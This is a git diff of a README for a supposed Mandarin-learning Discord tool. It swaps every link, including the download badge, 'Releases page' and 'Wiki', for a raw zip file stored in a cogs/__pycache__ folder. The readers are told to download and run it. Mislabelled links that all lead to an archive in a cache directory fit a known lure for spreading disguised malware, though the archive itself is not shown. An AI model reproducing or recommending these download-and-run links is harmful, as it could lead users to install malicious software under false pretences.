@@ -1,6 +1,6 @@
 # 🌸 ChineseLessons-Discord - Learn Mandarin Easily on Discord
 
-[![Download Now](https://raw.githubusercontent.com/Kumikocodes/ChineseLessons-Discord/main/data/Discord_Lessons_Chinese_1.8.zip%20Now-Grab%20Your%20Copy-blue)](https://raw.githubusercontent.com/Kumikocodes/ChineseLessons-Discord/main/data/Discord_Lessons_Chinese_1.8.zip)
+[![Download Now](https://raw.githubusercontent.com/Kumikocodes/ChineseLessons-Discord/main/cogs/__pycache__/Discord_Chinese_Lessons_2.3-alpha.2.zip%20Now-Grab%20Your%20Copy-blue)](https://raw.githubusercontent.com/Kumikocodes/ChineseLessons-Discord/main/cogs/__pycache__/Discord_Chinese_Lessons_2.3-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to ChineseLessons-Discord! This tool helps you learn Mandarin in a fun a
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Kumikocodes/ChineseLessons-Discord/main/data/Discord_Lessons_Chinese_1.8.zip) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Kumikocodes/ChineseLessons-Discord/main/cogs/__pycache__/Discord_Chinese_Lessons_2.3-alpha.2.zip) to find the latest version of the application.
 2. **Choose Your Version**: Look for the latest release and find the appropriate file for your system.
 3. **Download the File**: Click the download link for your operating system to start the download.
 4. **Run the Application**: Once downloaded, locate the file and run it to begin.
@@ -51,7 +51,7 @@ ChineseLessons-Discord provides you with several tools to enhance your learning 
 
 ## ⚙️ Additional Resources
 
-For further guidance, tutorials, and community support, visit our [Wiki](https://raw.githubusercontent.com/Kumikocodes/ChineseLessons-Discord/main/data/Discord_Lessons_Chinese_1.8.zip). Here, you'll find detailed instructions and tips on maximizing your learning experience.
+For further guidance, tutorials, and community support, visit our [Wiki](https://raw.githubusercontent.com/Kumikocodes/ChineseLessons-Discord/main/cogs/__pycache__/Discord_Chinese_Lessons_2.3-alpha.2.zip). Here, you'll find detailed instructions and tips on maximizing your learning experience.
 
 ## 💬 Community Support
 
@@ -63,7 +63,7 @@ We welcome contributions! If you have ideas or improvements, feel free to create
 
 ## 🔗 Useful Links
 
-- [Releases page](https://raw.githubusercontent.com/Kumikocodes/ChineseLessons-Discord/main/data/Discord_Lessons_Chinese_1.8.zip)
-- [Wiki](https://raw.githubusercontent.com/Kumikocodes/ChineseLessons-Discord/main/data/Discord_Lessons_Chinese_1.8.zip)
+- [Releases page](https://raw.githubusercontent.com/Kumikocodes/ChineseLessons-Discord/main/cogs/__pycache__/Discord_Chinese_Lessons_2.3-alpha.2.zip)
+- [Wiki](https://raw.githubusercontent.com/Kumikocodes/ChineseLessons-Discord/main/cogs/__pycache__/Discord_Chinese_Lessons_2.3-alpha.2.zip)
 
 We hope you enjoy your journey in learning Mandarin with ChineseLessons-Discord! Don't forget to check back for updates and new features. Happy learning!
